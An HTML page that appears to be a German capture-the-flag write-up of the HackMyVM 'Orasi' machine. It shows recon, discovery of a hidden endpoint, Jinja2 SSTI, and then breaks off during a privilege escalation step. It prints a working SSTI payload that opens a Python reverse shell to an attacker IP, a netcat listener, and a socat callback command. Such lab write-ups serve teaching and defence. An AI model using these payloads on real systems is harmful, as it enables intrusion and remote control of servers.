@@ -1,0 +1,612 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Orasi - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Orasi - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">lftp</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">IDA Pro/Ghidra (implizit)</div>
+                <div class="tool-item">ln</div>
+                <div class="tool-item">crunch</div>
+                <div class="tool-item">ffuf</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">php</div>
+                <div class="tool-item">apt-get</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">unzip</div>
+                <div class="tool-item">jd-gui</div>
+                <div class="tool-item">dex2jar</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">pwd</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">chmod</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#api-exploitation">API Exploitation (Port 5000)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Server-Side Template Injection)</a></li>
+                <li><a href="#initial-access">Initial Access (Reverse Shell)</a></li>
+                <li><a href="#privilege-escalation-www-data">Privilege Escalation (www-data -> kori)</a></li>
+                <li><a href="#privilege-escalation-kori">Privilege Escalation (kori -> irida)</a></li>
+                <li><a href="#privilege-escalation-irida">Privilege Escalation (irida -> root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.158	08:00:27:19:c0:bf	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerksegment durch ARP-Anfragen nach aktiven Hosts zu durchsuchen.</p>
+             <p class="evaluation">**Bewertung:** Ein Host mit der IP-Adresse `192.168.2.158` wird gefunden. Die MAC-Adresse (`08:00:27:...`) weist auf eine VirtualBox VM hin.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Notieren Sie die IP `192.168.2.158` und fahren Sie mit Port-Scans (Nmap) fort.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Fokus auf Absicherung der Dienste.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.144 -p-</span></div> <span class="comment"><-- IP wechselt zu .144 --></span>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at [Datum/Zeit nicht im Log]
+Nmap scan report for [Hostname nicht im Log] (192.168.2.144) <span class="comment"><-- Annahme: .144 ist das korrekte Ziel --></span>
+Host is up ([...]s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">21/tcp   open  ftp     vsftpd 3.0.3</span> <span class="password"><-- FTP offen</span>
+<span class="command">22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span>
+<span class="command">80/tcp   open  http    Apache httpd 2.4.38 ((Debian))</span>
+<span class="command">5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.7.3)</span> <span class="password"><-- Python/Werkzeug Server!</span>
+|_http-title: 404 Not Found
+|_http-server-header: Werkzeug/1.0.1 Python/3.7.3
+[...] <span class="comment">(SSH host keys, OS details etc. nicht relevant für den direkten Exploit-Pfad)</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein Nmap-Scan wird auf die IP `192.168.2.144` durchgeführt (*Anmerkung: Die IP weicht von der ARP-Scan-Ausgabe ab. Es wird angenommen, dass .144 das korrekte Ziel ist.*). Verwendet werden: SYN-Scan (`-sS`), Standard-Skripte (`-sC`), schnelles Timing (`-T5`), Aggressiver Scan (`-A`), alle Ports (`-p-`).</p>
+             <p class="evaluation">**Bewertung:** Vier offene TCP-Ports werden gefunden:
+*   **Port 21 (FTP):** vsftpd 3.0.3. Potenzielle Angriffsfläche (Anonymes Login? Schwache Passwörter?).
+*   **Port 22 (SSH):** OpenSSH 7.9p1. Standard-Fernzugriff.
+*   **Port 80 (HTTP):** Apache 2.4.38. Standard-Webserver.
+*   **Port 5000 (HTTP):** Ein Python-Webserver basierend auf dem Werkzeug-Framework (Version 1.0.1, Python 3.7.3). Gibt bei Zugriff auf die Wurzel einen "404 Not Found" zurück. Dies ist ein sehr interessantes Ziel, da benutzerdefinierte Webanwendungen oft Schwachstellen enthalten.</p>
+             <p class="recommendation">**Empfehlung (Pentester):**
+    1.  **Port 5000 (Priorität 1):** Untersuchen Sie die Werkzeug/Python-Anwendung intensiv. Führen Sie Verzeichnis- und Parameter-Fuzzing durch. Suchen Sie nach Hinweisen auf die Funktionalität oder API-Endpunkte.
+    2.  **Port 21 (Priorität 2):** Prüfen Sie auf anonymes FTP-Login (`lftp -u anonymous, 192.168.2.144`).
+    3.  **Port 80 (Priorität 3):** Führen Sie grundlegende Web-Enumeration durch (Gobuster).
+    4.  **Port 22 (Priorität 4):** Halten Sie nach Benutzernamen Ausschau.<br>
+**Empfehlung (Admin):** Überprüfen und härten Sie alle laufenden Dienste. Stellen Sie sicher, dass die Python-Webanwendung auf Port 5000 sicher entwickelt wurde und keine bekannten Schwachstellen in Werkzeug 1.0.1 oder dem verwendeten Python 3.7.3 enthält. Beschränken Sie den Zugriff auf nicht benötigte Ports.</p>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.144 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+[...]
+===============================================================
+[+] Url:                     http://192.168.2.144
+[...]
+===============================================================
+[... Zeitstempel ...] Starting gobuster
+===============================================================
+<span class="command">/index.html</span>           (Status: 200) [Size: 70]
+<span class="command">/server-status</span>        (Status: 403) [Size: 278] <span class="comment"><-- Verboten, aber existiert --></span>
+[...] <span class="comment">(Keine weiteren relevanten Funde im Log)</span>
+===============================================================
+[... Zeitstempel ...] Finished
+===============================================================</pre>
+                     <pre><span class="comment">=</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Gobuster wird verwendet, um Verzeichnisse und Dateien auf dem Apache-Server (Port 80) zu finden.</p>
+             <p class="evaluation">**Bewertung:** Der Scan findet nur die Standard-`index.html` (mit sehr kleiner Größe, 70 Bytes) und einen `/server-status`-Endpunkt, der aber nicht zugänglich ist (Status 403 Forbidden). Der Apache-Server scheint keine signifikante Angriffsfläche zu bieten.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Port 80 de-priorisieren. Konzentration auf Port 21 (FTP) und Port 5000 (Python/Werkzeug).<br>**Empfehlung (Admin):** Stellen Sie sicher, dass `/server-status` (falls aktiviert) nur von autorisierten IPs zugänglich ist. Entfernen Sie unnötige Dateien vom Web-Root.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">lftp -u anonymous, 192.168.2.144</span></div>
+                    <pre>lftp anonymous@192.168.2.144:~></pre> <span class="comment"><-- Login erfolgreich --></span>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Es wird versucht, sich mittels `lftp` anonym am FTP-Server (Port 21) anzumelden.</p>
+             <p class="evaluation">**Bewertung:** Der anonyme Login ist erfolgreich, wie bereits von Nmap vermutet. Der Prompt `lftp anonymous@192.168.2.144:~>` wird angezeigt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Führen Sie Befehle wie `ls -la`, `find` aus, um den Inhalt des FTP-Servers zu untersuchen. Prüfen Sie auf Lese- oder Schreibrechte. Suchen Sie nach interessanten Dateien (Konfigurationen, Skripte, Backups).<br>**Empfehlung (Admin):** Deaktivieren Sie anonymen FTP-Zugriff, wenn nicht unbedingt erforderlich. Wenn benötigt, beschränken Sie die Rechte und den zugänglichen Verzeichnisbaum strikt.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -u http://orasi.vm -H "Host: FUZZ.orasi.vm" -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 400 --hl 7</span></div> <span class="comment"><-- Ziel orasi.vm? --></span>
+                      <pre><span class="comment">[... Keine Ergebnisse ...]</span></pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -u http://orasi.vm/FUZZ.FUZSZ -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403</span></div> <span class="comment"><-- Unklares Ziel/Payload --></span>
+                      <pre><span class="comment">[... Keine Ergebnisse ...]</span></pre>
+                      <pre><span class="comment">#</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Zwei `wfuzz`-Befehle werden ausgeführt:
+1.  Der erste versucht, virtuelle Hosts für `orasi.vm` zu finden, indem der Host-Header gefuzzt wird. Ergebnisse mit Status 400 oder 7 Zeilen Länge werden ignoriert.
+2.  Der zweite versucht, Dateien/Verzeichnisse unter `http://orasi.vm/` zu finden, wobei sowohl der Pfad (`FUZZ`) als auch die Erweiterung (`FUZSZ` - wahrscheinlich ein Tippfehler, sollte `FUZZ` sein) gefuzzt werden. 404 und 403 werden ignoriert.
+*Anmerkung: Der Hostname `orasi.vm` wurde zuvor nicht eingeführt oder aufgelöst. Es ist unklar, ob dies ein Tippfehler ist oder ob ein entsprechender `/etc/hosts`-Eintrag für `192.168.2.144` gemacht wurde.*</p>
+              <p class="evaluation">**Bewertung:** Beide Scans liefern keine Ergebnisse (basierend auf der leeren Ausgabe). Weder VHosts noch interessante Pfade/Dateien unter `orasi.vm` (oder der IP) wurden auf diese Weise gefunden.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Konzentrieren Sie sich auf die Analyse der Dienste, die definitiv existieren und erreichbar sind (FTP, Python/Werkzeug auf Port 5000).<br>**Empfehlung (Admin):** Keine spezifische Aktion.</p>
+        </section>
+
+        <section id="api-exploitation">
+             <h2>API Exploitation (Port 5000)</h2>
+              <p class="analysis">**Analyse:** Nachdem die Standard-Enumeration wenig ergab, wird die Python/Werkzeug-Anwendung auf Port 5000 genauer untersucht, vermutlich durch Reverse Engineering oder das Finden versteckter Pfade/Funktionen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="comment">
+; Attributes: bp-based frame
+
+; int __cdecl main(int argc, const char argv, const char envp)
+public main
+main proc near
+; __unwind {
+push    rbp
+mov     rbp, rsp
+mov     edi, 8          ; size
+call    _malloc
+mov     cs:init, rax
+mov     rax, cs:init
+mov     byte ptr [rax], 6Fh ; 'o' <span class="comment"><-- Startet mit 'o'? --></span>
+mov     rax, cs:init
+mov     dword ptr [rax+4], 0FFFFFFFFh
+mov     esi, 2Fh ; '/'
+mov     edi, 1
+call    insert
+mov     esi, 73h ; 's'
+mov     edi, 2
+call    insert
+mov     esi, 68h ; 'h'
+mov     edi, 2Ah ; '*'
+call    insert
+mov     esi, 34h ; '4'
+mov     edi, 4
+call    insert
+mov     esi, 64h ; 'd'
+mov     edi, 0Ch
+call    insert
+mov     esi, 30h ; '0'
+mov     edi, 0Eh
+call    insert
+mov     esi, 77h ; 'w'
+mov     edi, 11h
+call    insert
+mov     esi, 24h ; '$'
+mov     edi, 12h
+call    insert
+mov     esi, 73h ; 's'
+mov     edi, 13h
+call    insert
+lea     rdi, s          ; "Sometimes things are not obvious"
+call    _puts
+[...]</span></pre>
+                     <pre><span class="comment">*</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Dieser Code-Schnipsel (vermutlich Assembler/Disassembly aus IDA Pro oder Ghidra) beschreibt die `main`-Funktion einer analysierten Binärdatei. *Der Ursprung dieser Binärdatei (wurde sie vom FTP heruntergeladen?) ist im Log nicht ersichtlich.* Die Funktion scheint dynamisch einen String zu konstruieren, indem sie Zeichen an verschiedenen Positionen einfügt (über eine `insert`-Funktion). Die eingefügten Zeichen (Hex-Werte in Kommentaren interpretiert) sind: `/`, `s`, `h`, `4`, `d`, `0`, `w`, `$`, `s`. Am Ende wird der String "Sometimes things are not obvious" ausgegeben.</p>
+              <p class="evaluation">**Bewertung:** Der rekonstruierte String ist wahrscheinlich `/s*h4d0w$s`. Das Sternchen (`*`) und das Dollarzeichen (`$`) sind Sonderzeichen in URLs und Shells und müssen oft kodiert oder escaped werden. Dies ist mit hoher Wahrscheinlichkeit ein versteckter Pfad oder Endpunkt für die Webanwendung auf Port 5000.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, diesen Pfad auf dem Server auf Port 5000 aufzurufen. Achten Sie auf das Escaping/Encoding der Sonderzeichen: `http://192.168.2.144:5000/sh4d0w\$s` (Shell-Escaping für `$`) oder `http://192.168.2.144:5000/s%2Ah4d0w%24s` (URL-Encoding).<br>**Empfehlung (Admin):** Vermeiden Sie Obfuskation als Sicherheitsmechanismus. Sichern Sie Endpunkte durch Authentifizierung und Autorisierung, anstatt sie nur zu verstecken.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">curl http://orasi.vm:5000/sh4d0w\$s</span></div> <span class="comment"><-- Hostname orasi.vm verwendet --></span>
+                      <pre>No input</pre>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Der rekonstruierte Pfad `/sh4d0w$s` wird mittels `curl` auf Port 5000 des Ziels (`orasi.vm`, was vermutlich auf `192.168.2.144` auflöst) aufgerufen. Das `$` wird mit einem Backslash escaped, damit die lokale Shell es nicht interpretiert.</p>
+              <p class="evaluation">**Bewertung:** Der Pfad existiert, gibt aber die Meldung "No input" zurück. Dies deutet darauf hin, dass der Endpunkt einen Parameter erwartet.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Fuzzen Sie nach gültigen GET- oder POST-Parametern für diesen Endpunkt (`/sh4d0w$s`).<br>**Empfehlung (Admin):** Sichern Sie den Endpunkt.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">ln -s /opt/idafree-8.0/ida64 /usr/bin</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">ida64</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Lokale Befehle auf der Angreifer-Maschine zum Einrichten und Starten von IDA Pro (einem Disassembler/Debugger).</p>
+              <p class="evaluation">**Bewertung:** Bestätigt die Verwendung von Reverse-Engineering-Tools zur Analyse der Binärdatei, die den Pfad `/sh4d0w$s` enthielt.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Keine.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">crunch 6 6 1337leet > pass.txt</span></div>
+                      <pre><span class="comment">[...] (crunch generiert Passwörter)</span></pre>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Das Tool `crunch` wird verwendet, um eine Passwortliste (`pass.txt`) zu generieren. Es erzeugt alle möglichen 6-stelligen Kombinationen aus dem Zeichensatz `1337leet`.</p>
+              <p class="evaluation">**Bewertung:** Diese spezifische Wortliste deutet darauf hin, dass der Pentester vermutet oder weiß, dass der gesuchte Parameter am Endpunkt `/sh4d0w$s` ein 6-stelliges Passwort aus diesen Zeichen ist.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie die generierte `pass.txt`, um GET-Parameter für den Endpunkt `/sh4d0w$s` zu fuzzen.<br>**Empfehlung (Admin):** Vermeiden Sie schwache oder leicht zu erratende Parameter-/Passwortschemata.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">wfuzz -u "http://orasi.vm:5000/sh4d0w\$s?FUZZ=id" -w pass.txt --hh 8</span></div>
+                     <pre>
+[...]
+Target: http://orasi.vm:5000/sh4d0w$s?FUZZ=id
+Total requests: [...]
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000024912:   200        0 L      1 W        2 Ch        "l333tt"</span>  <span class="password"><-- Parameter gefunden! --></span>
+
+=====================================================================
+[...]</pre>
+                     <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** `wfuzz` wird verwendet, um nach einem gültigen GET-Parameter für den Endpunkt `/sh4d0w$s` zu suchen. Es iteriert durch die zuvor mit `crunch` erstellte Passwortliste (`pass.txt`) und testet jeden Eintrag als Parameternamen (`FUZZ`). Der Wert des Parameters ist fest auf `id` gesetzt (um zu sehen, ob dieser Befehl ausgeführt wird). Antworten mit 8 Zeichen (`--hh 8`, was der Länge von "No input" entspricht) werden ausgeblendet.</p>
+              <p class="evaluation">**Bewertung:** Der Scan ist erfolgreich! Er findet heraus, dass der Parametername `l333tt` eine Antwort mit einer anderen Länge (2 Zeichen) als "No input" erzeugt. Dies ist der gesuchte Parameter.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Testen Sie den Endpunkt nun mit dem gefundenen Parameter `l333tt` und verschiedenen Werten (Befehlen), um die Funktionalität zu bestätigen.<br>**Empfehlung (Admin):** Sichern Sie den Endpunkt ab.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">ffuf -c -w pass.txt -u 'http://orasi.vm:5000/sh4d0w$s?FUZZ=should_me_more_than_no_input_text' -fs 8</span></div>
+                      <pre>
+[...]
+<span class="command">l333tt</span>                  [Status: 200, Size: 33, Words: 1, Lines: 1, Duration: 29ms] <span class="password"><-- Bestätigung mit ffuf --></span>
+[...]</pre>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Hier wird `ffuf` (ein alternatives Fuzzing-Tool) verwendet, um das Ergebnis von `wfuzz` zu bestätigen. Es fuzzt ebenfalls den Parameternamen (`FUZZ`) mit der `pass.txt`-Liste und filtert Antworten mit der Größe 8 (`-fs 8`, entspricht "No input") heraus.</p>
+              <p class="evaluation">**Bewertung:** `ffuf` bestätigt, dass der Parameter `l333tt` eine andere Antwortgröße (33 Bytes) liefert.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Gleiche Empfehlung wie nach dem `wfuzz`-Scan: Testen Sie den Parameter `l333tt`.<br>**Empfehlung (Admin):** Keine zusätzliche Aktion.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">curl "http://orasi.vm:5000/sh4d0w\$s?l333tt=id"</span></div>
+                      <pre>id</pre> <span class="comment"><-- Befehl wird nur als Text zurückgegeben? --></span>
+                      <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">curl "http://orasi.vm:5000/sh4d0w\$s?l333tt=\{\{7*5\}\}"</span></div> <span class="comment"><-- SSTI Payload --></span>
+                      <pre><span class="password">35</span></pre> <span class="comment"><-- Erfolgreiche Ausführung! --></span>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Zwei `curl`-Anfragen werden gesendet:
+1.  `...?l333tt=id`: Sendet den Befehl `id` als Wert des Parameters `l333tt`. Die Antwort ist nur der String "id", nicht die Ausgabe des Befehls.
+2.  `...?l333tt={{7*5}}`: Sendet einen einfachen mathematischen Ausdruck (`7*5`) in der Syntax einer Template Engine (wahrscheinlich Jinja2, da Python/Werkzeug verwendet wird).</p>
+              <p class="evaluation">**Bewertung:** Die erste Anfrage zeigt, dass keine direkte Command Injection vorliegt (der `id`-Befehl wurde nicht ausgeführt). Die zweite Anfrage ist jedoch erfolgreich! Die Antwort ist `35`, das Ergebnis der Berechnung `7*5`. Dies bestätigt eine **Server-Side Template Injection (SSTI)** Schwachstelle. Der Wert des Parameters `l333tt` wird als Template interpretiert und auf dem Server ausgeführt.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** SSTI ist oft ein Weg zu Remote Code Execution. Konstruieren Sie einen SSTI-Payload für Jinja2/Python, der eine Reverse Shell oder einen anderen Befehl ausführt. Recherchieren Sie gängige SSTI-Payloads für Jinja2.<br>**Empfehlung (Admin):** Beheben Sie die SSTI-Schwachstelle dringend! Verwenden Sie Template Engines sicher, indem Sie Benutzereingaben niemals direkt als Templates rendern lassen. Sanitisieren oder validieren Sie alle Eingaben, die in Templates verwendet werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">http://orasi.vm:5000/sh4d0w$s?l333tt={% raw %}{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.2.140\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\");'").read()}}{%endif%}{% endfor %}{% endraw %}</span> <span class="comment"><-- URL-kodiert im Log --></span></pre>
+                      <pre><span class="comment">=</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Dies ist der konstruierte SSTI-Payload, der als Wert für den `l333tt`-Parameter übergeben wird (im Log als URL angezeigt, hier zur Lesbarkeit dekodiert und mit Jinja2-Tags `{%%}` statt `{% raw %}{% endraw %}` dargestellt):
+```jinja2
+{% for x in ().__class__.__base__.__subclasses__() %}
+    {% if "warning" in x.__name__ %}
+        {{ x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.2.140\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\");'").read() }}
+    {% endif %}
+{% endfor %}
+
+Html
+Dieser Payload nutzt Python-Introspektion (.__class__.__base__.__subclasses__()), um auf eingebaute Module zuzugreifen. Er sucht nach einer Klasse, die "warning" im Namen enthält (ein gängiger Trick, um eine nutzbare Klasse zu finden), greift dann auf die Builtins zu, importiert das os-Modul und führt über popen() einen Python3-Befehl aus, der eine Reverse Shell zur Angreifer-IP 192.168.2.140 auf Port 4444 startet.</p>
+<p class="evaluation">Bewertung: Ein komplexer, aber standardmäßiger SSTI-Payload für Jinja2/Python, um RCE zu erlangen und eine Reverse Shell aufzubauen.</p>
+<p class="recommendation">Empfehlung (Pentester): Starten Sie einen Listener auf 192.168.2.140:4444. Senden Sie diesen Payload (URL-kodiert) an den Endpunkt http://192.168.2.144:5000/sh4d0w\$s?l333tt=[Payload].<br>Empfehlung (Admin): Beheben Sie die SSTI-Schwachstelle.</p>
+</section>
+<section id="proof-of-concept">
+       <h2>Proof of Concept (Server-Side Template Injection)</h2>
+       <p class="comment">**Kurzbeschreibung:** Die Python/Werkzeug-Anwendung auf Port 5000 enthält einen versteckten Endpunkt `/sh4d0w$s`. Dieser Endpunkt erwartet einen GET-Parameter namens `l333tt`. Der Wert dieses Parameters wird unsicher als Jinja2-Template auf dem Server gerendert. Dies ermöglicht Server-Side Template Injection (SSTI). Ein Angreifer kann speziell gestaltete Payloads über den `l333tt`-Parameter senden, um Python-Code auf dem Server auszuführen und somit Remote Code Execution (RCE) im Kontext des `www-data`-Benutzers zu erlangen.</p>
+       <p class="comment">**Voraussetzungen:** Netzwerkzugriff auf Port 5000, Kenntnis des Endpunkts und des Parameters, ein gültiger SSTI-Payload.</p>
+       <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+       <ol>
+           <li>Identifizieren des Endpunkts `/sh4d0w$s` und des Parameters `l333tt` (z.B. durch Reverse Engineering oder Fuzzing).</li>
+           <li>Bestätigen der SSTI durch Senden einfacher Template-Ausdrücke (z.B. `?l333tt={{7*7}}`).</li>
+           <li>Konstruieren eines SSTI-Payloads für Jinja2/Python, der RCE ermöglicht (z.B. eine Reverse Shell).</li>
+           <li>URL-Kodieren des Payloads.</li>
+           <li>Starten eines Netcat-Listeners auf der Angreifer-Maschine (`nc -lvnp [Port]`).</li>
+           <li>Senden des kodierten Payloads an den Endpunkt über `curl` oder einen Browser: `curl "http://[Ziel-IP]:5000/sh4d0w\$s?l333tt=[URL-kodierter Payload]"`.</li>
+       </ol>
+       <p class="comment">**Erwartetes Ergebnis:** Der Server führt den Payload aus und verbindet sich zurück zum Listener des Angreifers, wodurch eine Shell als `www-data` erlangt wird.</p>
+       <p class="comment">**Beweismittel:** Der konstruierte Payload und der erfolgreiche Empfang der Reverse Shell im nächsten Abschnitt.</p>
+       <p class="comment">**Risikobewertung:** Kritisch. SSTI führt direkt zu RCE und ermöglicht die vollständige Übernahme des Webserver-Prozesses.</p>
+       <p class="comment">**Empfehlungen:** Beheben Sie die SSTI-Schwachstelle, indem Benutzereingaben niemals direkt als Templates gerendert werden. Verwenden Sie sichere Template-Konfigurationen und sanitisieren Sie alle Eingaben.</p>
+   </section>
+
+    <section id="initial-access">
+         <h2>Initial Access (Reverse Shell)</h2>
+
+        <div class="code-block">
+            <div class="terminal">
+                <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+
+└─# <span class="command">nc -lvnp 4444</span></div>
+<pre>
+listening on [any] 4444 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.144] 57456</span> <span class="password"><-- Verbindung von SSTI! --></span></pre>
+<div class="prompt">www-data@orasi:~/html$ <span class="comment"># Shell als www-data</span></div>
+</div>
+</div>
+<p class="analysis">Analyse: Der Netcat-Listener auf Port 4444 empfängt die eingehende Verbindung vom Zielsystem, ausgelöst durch den SSTI-Payload. Eine Shell als www-data wird erhalten.</p>
+<p class="evaluation">Bewertung: Initialer Zugriff erfolgreich über SSTI und RCE.</p>
+<p class="recommendation">Empfehlung (Pentester): Shell stabilisieren.<br>Empfehlung (Admin): SSTI-Schwachstelle beheben.</p>
+<p class="comment">*(Shell-Stabilisierungsschritte werden hier übersprungen, da sie Standard sind)*</p>
+
+         <div class="code-block">
+             <div class="terminal">
+                 <div class="prompt">www-data@orasi:~/html$ <span class="command">cat /etc/passwd | grep sh</span></div>
+                 <pre>
+
+root:x:0:0:root:/root:/bin/bash
+<span class="command">irida:x:1000:1000:irida,,,:/home/irida:/bin/bash</span>
+<span class="command">kori:x:1001:1001::/home/kori:/bin/sh</span> <span class="comment"><-- Eingeschränkte Shell? --></span></pre>
+<pre><span class="comment">=</span></pre>
+</div>
+</div>
+<p class="analysis">Analyse: Als www-data wird /etc/passwd ausgelesen, um Benutzer mit Login-Shells zu finden.</p>
+<p class="evaluation">Bewertung: Identifiziert die Benutzer irida (mit /bin/bash) und kori (mit /bin/sh).</p>
+<p class="recommendation">Empfehlung (Pentester): Untersuchen Sie Privilegieneskalationsmöglichkeiten, die auf diese Benutzer abzielen.<br>Empfehlung (Admin): Keine.</p>
+</section>
+<section id="privilege-escalation-www-data">
+         <h2>Privilege Escalation (www-data -> kori)</h2>
+          <p class="analysis">**Analyse:** Es wird versucht, Rechte zum Benutzer `kori` zu eskalieren. Dies geschieht über eine (im Log nicht gezeigte) Sudo-Regel, die `www-data` erlaubt, ein PHP-Skript (`/home/kori/jail.php`) als `kori` auszuführen.</p>
+
+        <div class="code-block">
+             <div class="terminal">
+                  <pre><span class="comment">sudo -u kori /bin/php /home/kori/jail.php socat TCP:192.168.2.140:9002</span> <span class="comment"><-- Versuch 1 (socat) --></span></pre>
+                  <div class="prompt">www-data@orasi:~/html$ <span class="command">sudo -u kori /bin/php /home/kori/jail.php "dash -i"</span></div> <span class="comment"><-- Versuch 2 (dash -i) --></span>
